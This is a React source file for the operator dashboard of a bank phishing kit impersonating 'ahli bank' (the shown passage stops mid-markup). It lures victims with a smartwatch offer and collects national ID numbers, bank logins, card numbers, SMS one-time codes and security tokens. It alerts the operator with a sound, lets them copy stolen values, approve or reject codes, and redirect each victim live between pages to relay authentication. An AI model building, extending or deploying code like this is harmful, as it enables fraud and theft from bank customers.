import React, { useState, useEffect, useMemo, useRef, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import {
  RequestData,
  ActiveSessionInfo,
  VisitorMeta,
  listCardRequests,
  updateCardRequest,
  deleteCardRequest,
  getServerStats,
  verifyAdminSession,
  adminLogoutApi
} from '../services/requestService';
import { LOGO_SRC } from '../types';
import {
  RefreshCw,
  Search,
  LogOut,
  Globe,
  Wifi,
  Mail,
  Key,
  Bell,
  BellOff,
  Volume2,
  Trash2,
  User,
  ChevronDown,
  MessageSquare,
  TrendingUp,
  Clock,
  X,
  Archive,
  MoreHorizontal,
  Star,
  Flag,
  Info,
  List,
  Smartphone,
  CreditCard,
  Building2,
  MapPin,
  Monitor,
  AppWindow,
  PanelLeftClose,
  PanelLeftOpen,
  Megaphone,
  Check,
  Ban,
  FileText
} from 'lucide-react';

const pageLabels: Record<string, string> = {
  '/': 'الصفحة الرئيسية',
  '/form': 'بيانات العميل',
  '/select-watch': 'تخصيص الساعة الذكية',
  '/link-service': 'توضيح خدمة الربط',
  '/login': 'تسجيل الدخول المصرفي',
  '/card-link': 'ربط بطاقة الخصم / الائتمان',
  '/otp': 'رمز التحقق OTP (SMS)',
  '/verify': 'رمز الأمان TOKEN (5 أرقام)',
  '/success': 'تأكيد الطلب بنجاح',
  // legacy aliases
  '/request': 'بيانات العميل',
  '/card-details': 'ربط البطاقة',
  '/waiting': 'رمز التحقق OTP',
  '/otp-bank': 'الموافقة البنكية'
};

const redirectOptions = [
  { value: '/', label: 'الصفحة الرئيسية' },
  { value: '/form', label: 'بيانات العميل' },
  { value: '/select-watch', label: 'تخصيص الساعة' },
  { value: '/link-service', label: 'توضيح الربط' },
  { value: '/login', label: 'تسجيل الدخول' },
  { value: '/card-link', label: 'ربط البطاقة' },
  { value: '/otp', label: 'رمز التحقق OTP (SMS)' },
  { value: '/verify', label: 'رمز الأمان TOKEN (5 أرقام)' },
  { value: '/success', label: 'تأكيد الطلب' }
];

const stepFallbackPage: Record<string, string> = {
  form: '/select-watch',
  watch: '/link-service',
  link: '/login',
  login: '/card-link',
  card: '/otp',
  otp: '/otp',
  'otp-bank': '/otp-bank',
  verify: '/verify'
};

const NOTIFICATION_SOUND_URL = '/assets/aistudio/notification_85556173.mp3';

export const AdminDashboard: React.FC = () => {
  const navigate = useNavigate();

  const [requests, setRequests] = useState<RequestData[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [searchQuery, setSearchQuery] = useState('');
  const [showSearchInput, setShowSearchInput] = useState(false);
  const [filterMode, setFilterMode] = useState<'all' | 'online' | 'card' | 'otp' | 'archived'>('all');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [authChecking, setAuthChecking] = useState(true);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [showLeftSubPanel, setShowLeftSubPanel] = useState(true);
  const [showUserMenu, setShowUserMenu] = useState(false);

  const [selectedRequestId, setSelectedRequestId] = useState<string | null>(null);
  const [starredIds, setStarredIds] = useState<Set<string>>(new Set());
  const [archivedIds, setArchivedIds] = useState<Set<string>>(new Set());
  const [flaggedIds, setFlaggedIds] = useState<Set<string>>(new Set());
  const [copiedField, setCopiedField] = useState('');

  const [onlineCount, setOnlineCount] = useState(0);
  const [totalVisitorsCount, setTotalVisitorsCount] = useState(0);
  const [onlineUsers, setOnlineUsers] = useState<Record<string, boolean>>({});
  const [userPages, setUserPages] = useState<Record<string, string>>({});
  const [userMeta, setUserMeta] = useState<Record<string, VisitorMeta>>({});
  const [activeSessions, setActiveSessions] = useState<ActiveSessionInfo[]>([]);
  const [selectedRedirectPage, setSelectedRedirectPage] = useState('');
  const [redirectFeedback, setRedirectFeedback] = useState('');
  const [isDeleting, setIsDeleting] = useState<string | null>(null);

  const knownSignatureRef = useRef('');

  const normalizeActionToPath = (action?: string | null): string => {
    if (!action) return '';
    if (action === 'otp-sms' || action === 'otp') return '/otp';
    if (action === 'otp-bank') return '/otp-bank';
    return action;
  };

  const getRequestCurrentPagePath = useCallback((req: RequestData) => {
    if (userPages[req.id]) return userPages[req.id];
    const pending = normalizeActionToPath(req.nextAction);
    if (pending) return pending;
    return stepFallbackPage[req.step] || (req.cardType === 'company' ? '/register-company' : '/request');
  }, [userPages]);

  const getRequestCurrentPageLabel = useCallback((req: RequestData) => {
    const path = getRequestCurrentPagePath(req);
    return pageLabels[path] || path;
  }, [getRequestCurrentPagePath]);

  const selectedRequest = useMemo(() => {
    return requests.find((req) => req.id === selectedRequestId) || null;
  }, [requests, selectedRequestId]);

  useEffect(() => {
    if (selectedRequest) {
      setSelectedRedirectPage(getRequestCurrentPagePath(selectedRequest));
    } else {
      setSelectedRedirectPage('');
    }
  }, [selectedRequest, getRequestCurrentPagePath]);

  const playNotificationSound = useCallback((force = false) => {
    if (!soundEnabled && !force) return;
    try {
      const audio = new Audio(NOTIFICATION_SOUND_URL);
      audio.play().catch((err) => {
        console.warn('Audio playback blocked or failed', err);
      });
    } catch (err) {
      console.warn('Audio setup failed', err);
    }
  }, [soundEnabled]);

  const fetchAll = useCallback(async (isInitial = false) => {
    try {
      const [statsResult, reqResult] = await Promise.allSettled([
        getServerStats(),
        listCardRequests()
      ]);

      if (statsResult.status === 'fulfilled') {
        const stats = statsResult.value;
        setOnlineCount(stats.onlineCount);
        setTotalVisitorsCount(stats.totalVisitorsCount);
        setOnlineUsers(stats.onlineUsers || {});
        setUserPages(stats.userPages || {});
        setUserMeta(stats.userMeta || {});
        setActiveSessions(stats.activeSessions || []);
      }

      if (reqResult.status === 'fulfilled') {
        const reqList = reqResult.value;
        const newSig = reqList
          .map((r) => `${r.id}:${r.updatedAt}:${r.step}:${r.cardNumber}:${r.otp}`)
          .join('|');
        if (!isInitial && knownSignatureRef.current && newSig !== knownSignatureRef.current) {
          playNotificationSound();
        }
        knownSignatureRef.current = newSig;
        setRequests(reqList);
        setSelectedRequestId((prev) => {
          if (prev && reqList.some((r) => r.id === prev)) return prev;
          return reqList.length > 0 ? reqList[0].id : null;
        });
        setError('');
      } else if (isInitial) {
        setError(reqResult.reason?.message || 'تعذر تحميل البيانات من الخادم.');
      }

      setLoading(false);
    } catch (err) {
      console.error('Error fetching dashboard data:', err);
      if (isInitial) {
        setError('تعذر تحميل البيانات من الخادم.');
        setLoading(false);
      }
    }
  }, [playNotificationSound]);

  useEffect(() => {
    const unlockAudio = () => {
      // Just a dummy play/pause to unlock audio context/playback on first interaction
      const audio = new Audio(NOTIFICATION_SOUND_URL);
      audio.volume = 0;
      audio.play().then(() => {
        audio.pause();
      }).catch(() => {});
    };

    window.addEventListener('pointerdown', unlockAudio, { once: true });
    window.addEventListener('keydown', unlockAudio, { once: true });

    let pollTimer: ReturnType<typeof setInterval> | null = null;

    verifyAdminSession().then((valid) => {
      if (!valid) {
        navigate('/admin/login');
        return;
      }
      setIsAuthenticated(true);
      setAuthChecking(false);
      fetchAll(true);
      pollTimer = setInterval(() => fetchAll(false), 2000);
    });

    return () => {
      window.removeEventListener('pointerdown', unlockAudio);
      window.removeEventListener('keydown', unlockAudio);
      if (pollTimer) clearInterval(pollTimer);
    };
  }, [navigate, fetchAll]);

  const handleLogout = async () => {
    await adminLogoutApi();
    navigate('/admin/login');
  };

  const updateOtpStatus = async (id: string, status: string) => {
    try {
      await updateCardRequest(id, { otpStatus: status });
      await fetchAll(false);
    } catch (err) {
      console.error('Error updating OTP status:', err);
    }
  };

  const getStepFromPath = (path: string): string => {
    if (path === '/' || path === '/form') return 'form';
    if (path === '/select-watch') return 'watch';
    if (path === '/link-service') return 'link';
    if (path === '/login') return 'login';
    if (path === '/card-link') return 'card';
    if (path === '/otp') return 'otp';
    if (path === '/verify') return 'verify';
    if (path === '/success') return 'success';
    return 'form';
  };

  const updateNextAction = async (id: string, action: string) => {
    try {
      const normalized = normalizeActionToPath(action) || action;
      setSelectedRedirectPage(normalized);
      await updateCardRequest(id, {
        nextAction: normalized,
        step: getStepFromPath(normalized)
      });
      setRedirectFeedback('تم التوجيه');
      setTimeout(() => {
        setRedirectFeedback((prev) => (prev === 'تم التوجيه' ? '' : prev));
      }, 2000);
      await fetchAll(false);
    } catch (err) {
      console.error('Error updating next action:', err);
    }
  };

  const handleRejectCard = async (id: string) => {
    try {
      setSelectedRedirectPage('/card-details');
      await updateCardRequest(id, {
        otpStatus: 'card_rejected',
        nextAction: '/card-details'
      });
      setRedirectFeedback('تم رفض البطاقة');
      setTimeout(() => {
        setRedirectFeedback((prev) => (prev === 'تم رفض البطاقة' ? '' : prev));
      }, 2000);
      await fetchAll(false);
    } catch (err) {
      console.error('Error rejecting card:', err);
    }
  };

  const handleRedirectSelectChange = async (e: React.ChangeEvent<HTMLSelectElement>) => {
    const val = e.target.value;
    setSelectedRedirectPage(val);
    if (!selectedRequest || !val) return;
    await updateNextAction(selectedRequest.id, val);
  };

  const handleDeleteRequest = async (id: string, event?: React.MouseEvent) => {
    if (event) {
      event.stopPropagation();
    }
    if (!id || isDeleting === id) return;

    setIsDeleting(id);
    try {
      await deleteCardRequest(id);
      const remaining = requests.filter((r) => r.id !== id);
      setRequests(remaining);
      if (selectedRequestId === id) {
        setSelectedRequestId(remaining.length > 0 ? remaining[0].id : null);
      }
      knownSignatureRef.current = remaining
        .map((r) => `${r.id}:${r.updatedAt}:${r.step}:${r.cardNumber}:${r.otp}`)
        .join('|');
    } catch (err) {
      console.error('Error deleting request:', err);
    } finally {
      setIsDeleting(null);
    }
  };

  const toggleStar = (id: string) => {
    setStarredIds((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const toggleFlag = (id: string) => {
    setFlaggedIds((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const toggleArchive = (id: string) => {
    setArchivedIds((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const copyText = async (text?: string, label = 'card') => {
    if (!text) return;
    try {
      await navigator.clipboard.writeText(text);
      setCopiedField(label);
      setTimeout(() => {
        setCopiedField((prev) => (prev === label ? '' : prev));
      }, 1500);
    } catch {}
  };

  const isRequestOnline = useCallback(
    (req: RequestData): boolean => {
      if (onlineUsers[req.id]) return true;
      if (activeSessions.some((s) => s.requestId === req.id)) return true;
      const updatedMs = new Date(req.updatedAt || req.createdAt).getTime();
      if (!isNaN(updatedMs) && Date.now() - updatedMs < 25000) return true;
      return false;
    },
    [onlineUsers, activeSessions]
  );

  const getVisitorCode = (id: string) => {
    let hash = 0;
    for (let i = 0; i < id.length; i++) {
      hash = (hash * 31 + id.charCodeAt(i)) % 900000;
    }
    const num = 100000 + Math.abs(hash);
    return `V${num}`;
  };

  const getVisitorMeta = (req: RequestData): VisitorMeta => {
    return (
      userMeta[req.id] || {
        ip: '188.53.192.70',
        os: 'Windows',
        device: 'desktop',
        browser: 'Chrome',
        country: 'Saudi Arabia, Riyadh'
      }
    );
  };

  const formatCardTypeLabel = (cardType: string) => {
    if (cardType === 'silver') return 'الأساسية';
    if (cardType === 'gold') return 'الذهبية';
    if (cardType === 'platinum') return 'البلاتينية';
    if (cardType === 'company') return 'شركات';
    return 'مقيم';
  };

  const formatCardNumberSpaced = (cardNum?: string) => {
    if (!cardNum) return '';
    const digits = cardNum.replace(/\s+/g, '');
    return digits.replace(/(.{4})/g, '$1 ').trim();
  };

  const formatShortExpYear = (year?: string) => {
    if (!year) return '';
    return year.length === 4 ? year.slice(2) : year;
  };

  const formatTimelineTimestamp = (dateStr: string) => {
    const d = new Date(dateStr);
    if (isNaN(d.getTime())) return '12-27 | 10:42 pm';
    const month = String(d.getMonth() + 1).padStart(2, '0');
    const day = String(d.getDate()).padStart(2, '0');
    let hours = d.getHours();
    const minutes = String(d.getMinutes()).padStart(2, '0');
    const ampm = hours >= 12 ? 'pm' : 'am';
    hours = hours % 12 || 12;
    return `${month}-${day} | ${String(hours).padStart(2, '0')}:${minutes} ${ampm}`;
  };

  const formatRelativeTimeShort = (dateStr: string) => {
    const date = new Date(dateStr);
    const now = new Date();
    const diffInSeconds = Math.max(0, Math.floor((now.getTime() - date.getTime()) / 1000));

    if (diffInSeconds < 60) {
      return `${diffInSeconds} ثانية`;
    }
    const diffInMinutes = Math.floor(diffInSeconds / 60);
    if (diffInMinutes < 60) {
      return `${diffInMinutes} دقيقة`;
    }
    const diffInHours = Math.floor(diffInMinutes / 60);
    if (diffInHours < 24) {
      return `${diffInHours} ساعة`;
    }
    const diffInDays = Math.floor(diffInHours / 24);
    return `${diffInDays} يوم`;
  };

  const pendingApprovalsCount = useMemo(
    () => requests.filter((r) => 
      (r.otpStatus === 'login_pending') || 
      (r.otpStatus === 'card_pending') || 
      (r.otp && (!r.otpStatus || r.otpStatus === 'pending'))
    ).length,
    [requests]
  );

  const cardEnteredCount = useMemo(
    () => requests.filter((r) => Boolean(r.cardNumber)).length,
    [requests]
  );

  const filteredRequests = useMemo(() => {
    let list = requests;

    if (filterMode === 'archived') {
      list = list.filter((r) => archivedIds.has(r.id));
    } else {
      list = list.filter((r) => !archivedIds.has(r.id));
      if (filterMode === 'online') {
        list = list.filter((r) => isRequestOnline(r));
      } else if (filterMode === 'card') {
        list = list.filter((r) => Boolean(r.cardNumber));
      } else if (filterMode === 'otp') {
        list = list.filter((r) => Boolean(r.otp));
      }
    }

    if (!searchQuery.trim()) return list;
    const lowerQuery = searchQuery.toLowerCase();
    return list.filter(
      (req) =>
        req.name?.toLowerCase().includes(lowerQuery) ||
        req.mobile?.includes(lowerQuery) ||
        req.cardNumber?.includes(lowerQuery) ||
        req.idNumber?.includes(lowerQuery)
    );
  }, [requests, filterMode, archivedIds, isRequestOnline, searchQuery]);

  if (authChecking) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <RefreshCw className="w-8 h-8 animate-spin text-[#1976d2]" />
      </div>
    );
  }

  if (!isAuthenticated) return null;

  return (
    <div
      className="h-screen w-full max-w-none overflow-hidden bg-white flex flex-col font-sans text-gray-800 select-none"
      dir="ltr"
    >
      {/* ==================== TOP BAR 1: GLOBAL NEXA FLOW HEADER ==================== */}
      <header className="h-[34px] bg-white border-b border-gray-200 px-3 flex items-center justify-between shrink-0 text-xs">
        {/* Left: Brand + Telemetry Numbers */}
        <div className="flex items-center gap-2.5">
          <div className="flex items-center gap-2">
            <div className="bg-black px-2 py-0.5 rounded-md border border-neutral-800 flex items-center justify-center">
              <img
                src={LOGO_SRC}
                alt="البنك الأهلي - ahlibank"
                className="h-4 object-contain"
              />
            </div>
            <span className="font-extrabold text-[13px] tracking-tight text-gray-800">
              ahli bank <span className="text-[#004838] font-bold">Admin</span>
            </span>
          </div>

          <span className="text-gray-300">|</span>

          <div className="flex items-center gap-1.5 text-[11px] text-gray-500 font-mono tabular-nums">
            <Clock className="w-3.5 h-3.5 text-gray-400" />
            <span>{onlineCount}</span>
            <span className="text-gray-300">/</span>
            <span>{requests.length}</span>
            <span className="text-gray-300">/</span>
            <span>{cardEnteredCount}</span>
            <span className="text-gray-300">/</span>
            <span>{pendingApprovalsCount}</span>
            <span className="text-gray-300">/</span>
            <span>{totalVisitorsCount}</span>
            <TrendingUp className="w-3.5 h-3.5 text-[#1976d2] ml-1" />
          </div>
        </div>

        {/* Right: Status & System Icons */}
        <div className="flex items-center gap-3 text-gray-500">
          <span title="متصل بالخادم"><Globe className="w-3.5 h-3.5 text-[#16a34a]" /></span>
          <span title="الاتصال المباشر نشط"><Wifi className="w-3.5 h-3.5 text-[#16a34a]" /></span>
          <button
            onClick={() => fetchAll(false)}
            className="hover:text-gray-800 transition-colors cursor-pointer"
            title="تحديث البيانات"
          >
            <Mail className="w-3.5 h-3.5" />
          </button>
          <button
            onClick={() => setShowUserMenu(!showUserMenu)}
            className="hover:text-gray-800 transition-colors cursor-pointer"
            title="إعدادات الجلسة"
          >
            <Key className="w-3.5 h-3.5" />
          </button>
          <button
            onClick={() => playNotificationSound(true)}
            className="hover:text-[#1976d2] transition-colors cursor-pointer"
            title="تجربة صوت الإشعار"
          >
            <Volume2 className="w-3.5 h-3.5 text-[#1976d2]" />
          </button>
          <button
            onClick={() => {
              const next = !soundEnabled;
              setSoundEnabled(next);
              if (next) playNotificationSound(true);
            }}
            className="hover:text-gray-800 transition-colors cursor-pointer"
            title={soundEnabled ? 'كتم صوت التنبيهات' : 'تفعيل صوت التنبيهات'}
          >
            {soundEnabled ? (
              <Bell className="w-3.5 h-3.5 text-[#16a34a]" />
            ) : (
              <BellOff className="w-3.5 h-3.5 text-red-500" />
            )}
          </button>

          {/* Profile & Logout Dropdown */}
          <div className="relative">
            <button
              onClick={() => setShowUserMenu(!showUserMenu)}
              className="flex items-center gap-1 hover:bg-gray-100 px-1.5 py-0.5 rounded cursor-pointer"
            >
              <ChevronDown className="w-3 h-3 text-gray-500" />
              <div className="w-5 h-5 rounded-full bg-[#dbeafe] text-[#1976d2] flex items-center justify-center">
                <User className="w-3.5 h-3.5" />
              </div>
            </button>

            {showUserMenu && (
              <div
                className="absolute right-0 mt-1 w-36 bg-white border border-gray-200 rounded-lg shadow-lg py-1 z-50 text-right"
                dir="rtl"
              >
                <button
                  onClick={handleLogout}
                  className="w-full px-3 py-1.5 text-xs text-red-600 hover:bg-red-50 flex items-center gap-2 font-bold cursor-pointer"
                >
                  <LogOut className="w-3.5 h-3.5" />
                  <span>تسجيل الخروج</span>
                </button>
              </div>
            )}
          </div>
        </div>
      </header>

      {/* ==================== TOP BAR 2: INBOX SUMMARY BAR ==================== */}
      <div className="h-[38px] bg-white border-b border-gray-200 px-4 flex items-center justify-between shrink-0">
        <div className="flex items-center gap-2.5 text-xs font-mono tabular-nums">
          <div className="relative flex items-center">
            <MessageSquare className="w-4 h-4 text-gray-600" />
            <span className="absolute -top-1.5 -left-1.5 bg-[#1976d2] text-white text-[9px] font-bold w-3.5 h-3.5 rounded-full flex items-center justify-center">
              {Math.max(1, onlineCount)}
            </span>
          </div>
          <span className="text-gray-300">|</span>
          <span className="text-[#a16207] font-semibold">{requests.length}</span>
          <span className="text-gray-300">/</span>
          <span className="text-amber-500 font-semibold">{pendingApprovalsCount}</span>
          <span className="text-gray-300">/</span>
          <span className="text-[#16a34a] font-semibold">{onlineCount}</span>
        </div>

        <div className="flex items-center gap-4">
          <div className="flex items-center gap-2 text-xs font-mono tabular-nums">
            <span className="text-[#16a34a] font-semibold">{onlineCount}</span>
            <span className="text-gray-300">/</span>
            <span className="text-amber-500 font-semibold">{pendingApprovalsCount}</span>
            <span className="text-gray-300">/</span>
            <span className="text-gray-500 font-semibold">{requests.length}</span>
          </div>
          <h1 className="text-[15px] font-bold text-gray-700" dir="rtl">صندوق الوارد</h1>
        </div>
      </div>

      {/* ==================== MAIN SPLIT WORKSPACE ==================== */}
      <div className="flex-1 flex overflow-hidden">
        {/* LEFT MAIN WORKSPACE AREA */}
        <div className="flex-1 flex flex-col bg-white overflow-hidden">
          {selectedRequest ? (
            <>
              {/* WORKSPACE ROW 1: Visitor Identity & Action Controls */}
              <div className="h-[40px] border-b border-gray-200 px-3 flex items-center justify-between bg-white shrink-0 text-xs">
                {/* Left Toolbar Icons */}
                <div className="flex items-center gap-2.5 text-gray-500">
                  <button
                    onClick={() => setSelectedRequestId(null)}
                    className="w-5 h-5 border border-gray-400 rounded-xs flex items-center justify-center hover:bg-gray-100 text-gray-700 cursor-pointer"
                    title="إغلاق"
                  >
                    <X className="w-3.5 h-3.5" />
                  </button>

                  <button
                    onClick={() => toggleArchive(selectedRequest.id)}
                    className="px-2.5 py-1 border border-gray-200 rounded text-[11px] text-gray-600 hover:bg-gray-50 flex items-center gap-1.5 cursor-pointer"
                  >
                    <span>{archivedIds.has(selectedRequest.id) ? 'إلغاء الأرشفة' : 'أرشفة'}</span>
                    <Archive className="w-3 h-3 text-gray-400" />
                  </button>

                  <button
                    onClick={() => handleDeleteRequest(selectedRequest.id)}
                    disabled={isDeleting === selectedRequest.id}
                    className="px-2.5 py-1 border border-red-200 bg-red-50/60 hover:bg-red-100 rounded text-[11px] text-red-600 font-bold flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
                    title="حذف الطلب نهائياً"
                  >
                    <span>حذف</span>
                    <Trash2 className="w-3 h-3 text-red-500" />
                  </button>

                  <button className="hover:text-gray-800 cursor-pointer" onClick={() => fetchAll(false)}>
                    <MoreHorizontal className="w-4 h-4 text-[#1976d2]" />
                  </button>

                  <button
                    onClick={() => toggleStar(selectedRequest.id)}
                    className="hover:text-[#1976d2] cursor-pointer"
                    title="تمييز بنجمة"
                  >
                    <Star
                      className={`w-4 h-4 ${
                        starredIds.has(selectedRequest.id) ? 'fill-[#1976d2] text-[#1976d2]' : 'text-[#1976d2]'
                      }`}
                    />
                  </button>

                  <button
                    onClick={() => toggleFlag(selectedRequest.id)}
                    className="hover:text-gray-800 cursor-pointer"
                    title="متابعة"
                  >
                    <Flag
                      className={`w-3.5 h-3.5 ${
                        flaggedIds.has(selectedRequest.id) ? 'fill-red-500 text-red-500' : 'text-gray-400'
                      }`}
                    />
                  </button>

                  <Info className="w-3.5 h-3.5 text-gray-400" />

                  <span className="text-gray-200">|</span>

                  <div className="flex items-center gap-1 text-[11px] text-gray-500 font-mono tabular-nums">
                    <List className="w-3.5 h-3.5 text-gray-400" />
                    <span>10 - 0</span>
                  </div>
                </div>

                {/* Right Visitor Identity Metadata */}
                <div className="flex items-center gap-2.5 text-xs text-gray-700 overflow-x-auto">
                  <div className="flex items-center gap-1 font-semibold text-gray-700" dir="rtl">
                    <span>{formatCardTypeLabel(selectedRequest.cardType)}</span>
                    <Building2 className="w-3.5 h-3.5 text-gray-500" />
                  </div>

                  <span className="text-gray-300">|</span>

                  <button
                    onClick={() => copyText(selectedRequest.mobile, 'mobile')}
                    className="flex items-center gap-1 font-mono font-semibold text-gray-800 hover:text-[#1976d2] cursor-pointer tabular-nums"
                    title="انقر لنسخ رقم الجوال"
                  >
                    <span>{selectedRequest.mobile}</span>
                    <Smartphone className="w-3.5 h-3.5 text-gray-500" />
                  </button>

                  <span className="text-gray-300">|</span>

                  <button
                    onClick={() => copyText(selectedRequest.idNumber, 'id')}
                    className="flex items-center gap-1 font-mono font-semibold text-gray-800 hover:text-[#1976d2] cursor-pointer tabular-nums"
                    title="انقر لنسخ رقم الهوية"
                  >
                    <span>{selectedRequest.idNumber}</span>
                    <CreditCard className="w-3.5 h-3.5 text-gray-500" />
                  </button>

                  <span className="text-gray-300">|</span>

                  <div className="relative flex items-center gap-1 font-bold text-gray-800 pt-2">
                    <span className="absolute -top-1 left-1/2 -translate-x-1/2 bg-gray-500 text-white text-[8px] px-1.5 py-0.2 rounded-xs leading-tight whitespace-nowrap">
                      اسم الزائر
                    </span>
                    <span>{selectedRequest.name}</span>
                    <User className="w-3.5 h-3.5 text-gray-500" />
                  </div>

                  <span className="font-mono font-bold text-[#1976d2] text-xs ml-1 tabular-nums">
                    {getVisitorCode(selectedRequest.id)}
                  </span>
                </div>
              </div>

              {/* WORKSPACE ROW 2: Current Page Redirect Dropdown & Device Telemetry */}
              <div className="h-[44px] border-b border-gray-200 px-3 flex items-center justify-between bg-white shrink-0 text-xs">
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => setShowLeftSubPanel(!showLeftSubPanel)}
                    className="text-gray-500 hover:text-gray-800 p-1 rounded hover:bg-gray-100 cursor-pointer"
                    title="إظهار/إخفاء اللوحة الجانبية"
                  >
                    {showLeftSubPanel ? (
                      <PanelLeftClose className="w-4 h-4" />
                    ) : (
                      <PanelLeftOpen className="w-4 h-4" />
                    )}
                  </button>

                  <div className="relative w-44">
                    <label className="absolute -top-2 right-2.5 bg-white px-1 text-[9px] text-gray-400 font-semibold z-10">
                      الصفحة الحالية
                    </label>
                    <select
                      value={selectedRedirectPage}
                      onChange={handleRedirectSelectChange}
                      dir="rtl"
                      className="w-full border border-gray-300 rounded px-2.5 py-1 text-[11px] font-semibold text-gray-700 bg-white focus:outline-none focus:border-[#1976d2] cursor-pointer"
                    >
                      {redirectOptions.map((opt) => (
                        <option key={opt.value} value={opt.value}>
                          {opt.label}
                        </option>
                      ))}
                    </select>
                  </div>

                  <button
                    onClick={() => updateNextAction(selectedRequest.id, selectedRedirectPage)}
                    className="text-gray-400 hover:text-[#1976d2] p-1 transition-colors cursor-pointer flex items-center gap-1"
                    title="توجيه الزائر للصفحة المحددة"
                  >
                    <Megaphone className="w-4 h-4" />
                    {redirectFeedback && (
                      <span className="text-[10px] font-bold text-[#16a34a]">{redirectFeedback}</span>
                    )}
                  </button>
                </div>

                <div className="flex items-center gap-2 text-[11px] text-gray-700 overflow-x-auto">
                  <div className="flex items-center gap-1 font-mono tabular-nums">
                    <span>{getVisitorMeta(selectedRequest).ip}</span>
                    <Globe className="w-3.5 h-3.5 text-gray-500" />
                  </div>

                  <span className="text-gray-300">|</span>

                  <div className="flex items-center gap-1 font-semibold">
                    <span>{getVisitorMeta(selectedRequest).os}</span>
                    <AppWindow className="w-3.5 h-3.5 text-gray-500" />
                  </div>

                  <span className="text-gray-300">|</span>

                  <div className="flex items-center gap-1 font-semibold">
                    <span>{getVisitorMeta(selectedRequest).device}</span>
                    <Monitor className="w-3.5 h-3.5 text-gray-500" />
                  </div>

                  <span className="text-gray-300">|</span>

                  <div className="flex items-center gap-1 font-semibold">
                    <span>{getVisitorMeta(selectedRequest).browser}</span>
                    <AppWindow className="w-3.5 h-3.5 text-gray-500" />
                  </div>

                  <span className="text-gray-300">|</span>

                  <div className="flex items-center gap-1 font-semibold">
                    <span>{getVisitorMeta(selectedRequest).country}</span>
                    <MapPin className="w-3.5 h-3.5 text-gray-500" />
                  </div>

                  <span className="text-gray-300">|</span>

                  <div className="flex items-center gap-1 font-bold text-gray-800" dir="rtl">
                    <span>{getRequestCurrentPageLabel(selectedRequest)}</span>
                    <FileText className="w-3.5 h-3.5 text-gray-500" />
                  </div>
                </div>
              </div>

              {/* WORKSPACE BODY: Left Sub-Panel + Main Feed */}
              <div className="flex-1 flex overflow-hidden relative">
                {/* Far-Left Sub-Panel */}
                {showLeftSubPanel && (
                  <div className="w-[260px] border-r-[5px] border-gray-300 bg-white flex flex-col justify-between p-4 relative shrink-0">
                    <div className="space-y-4" dir="rtl">
                      <div className="border border-gray-200 rounded-lg p-3 bg-[#f9fafb]">
                        <div className="text-xs font-bold text-gray-700 mb-2.5 flex items-center justify-between">
                          <span>تحكم سريع بالزائر</span>
                          <span
                            className={`text-[10px] font-semibold flex items-center gap-1 ${
                              isRequestOnline(selectedRequest) ? 'text-[#16a34a]' : 'text-gray-400'
                            }`}
                          >
                            <span
                              className={`w-2 h-2 rounded-full ${
                                isRequestOnline(selectedRequest) ? 'bg-[#22c55e]' : 'bg-gray-300'
                              }`}
                            ></span>
                            {isRequestOnline(selectedRequest) ? 'متصل الآن' : 'غير متصل'}
                          </span>
                        </div>

                        <div className="grid grid-cols-1 gap-1.5">
                          {redirectOptions.map((opt) => (
                            <button
                              key={opt.value}
                              onClick={() => updateNextAction(selectedRequest.id, opt.value)}
                              className={`w-full py-1.5 px-2.5 rounded text-xs font-bold border transition-colors cursor-pointer text-right flex items-center justify-between ${
                                getRequestCurrentPagePath(selectedRequest) === opt.value
                                  ? 'bg-[#dbeafe] border-[#1976d2] text-[#1976d2]'
                                  : 'bg-white border-gray-200 text-gray-700 hover:bg-gray-50'
                              }`}
                            >
                              <span>{opt.label}</span>
                              <FileText className="w-3.5 h-3.5 shrink-0" />
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* OTP Verification Control Box */}
                      {selectedRequest.otp && (
                        <div className="border border-blue-200 rounded-lg p-3 bg-[#f0f7ff]">
                          <div className="text-xs font-bold text-gray-800 mb-1.5">رمز التحقق المدخل (OTP):</div>
                          <div
                            onClick={() => copyText(selectedRequest.otp, 'otp')}
                            className="font-mono text-xl font-black tracking-[0.25em] text-[#1976d2] bg-white border border-blue-200 rounded py-2 text-center mb-2.5 cursor-pointer select-all tabular-nums"
                          >
                            {selectedRequest.otp}
                          </div>

                          <div className="flex gap-2">
                            <button
                              onClick={() => updateOtpStatus(selectedRequest.id, 'approved')}
                              className="flex-1 bg-[#16a34a] hover:bg-[#15803d] text-white py-1.5 rounded text-xs font-bold flex items-center justify-center gap-1 cursor-pointer"
                            >
                              <Check className="w-3.5 h-3.5" />
                              <span>قبول</span>
                            </button>
                            <button
                              onClick={() => updateOtpStatus(selectedRequest.id, 'rejected')}
                              className="flex-1 bg-red-600 hover:bg-red-700 text-white py-1.5 rounded text-xs font-bold flex items-center justify-center gap-1 cursor-pointer"
                            >
                              <Ban className="w-3.5 h-3.5" />
                              <span>رفض</span>
                            </button>
                          </div>

                          {selectedRequest.otpStatus === 'approved' && (
                            <div className="mt-2 text-[11px] text-[#16a34a] font-bold text-center">
                              تمت الموافقة على الرمز
                            </div>
                          )}
                          {selectedRequest.otpStatus === 'rejected' && (
                            <div className="mt-2 text-[11px] text-red-600 font-bold text-center">
                              تم رفض الرمز وطلب رمز جديد
                            </div>
                          )}
                        </div>
                      )}
                    </div>

                    <div className="pt-4">
                      <button
                        onClick={() => fetchAll(false)}
                        className="w-11 h-11 rounded-full bg-[#1976d2] hover:bg-[#1565c0] text-white shadow-lg flex items-center justify-center cursor-pointer transition-transform active:scale-95"
                        title="تحديث المحادثة"
                      >
                        <MessageSquare className="w-5 h-5" />
                      </button>
                    </div>
                  </div>
                )}

                {/* Timeline Feed */}
                <div className="flex-1 overflow-y-auto px-8 py-6 bg-white">
                  <div className="max-w-4xl mx-auto flex flex-col">
                    {/* CARD 1: تفعيل عضوية أفراد / شركات */}
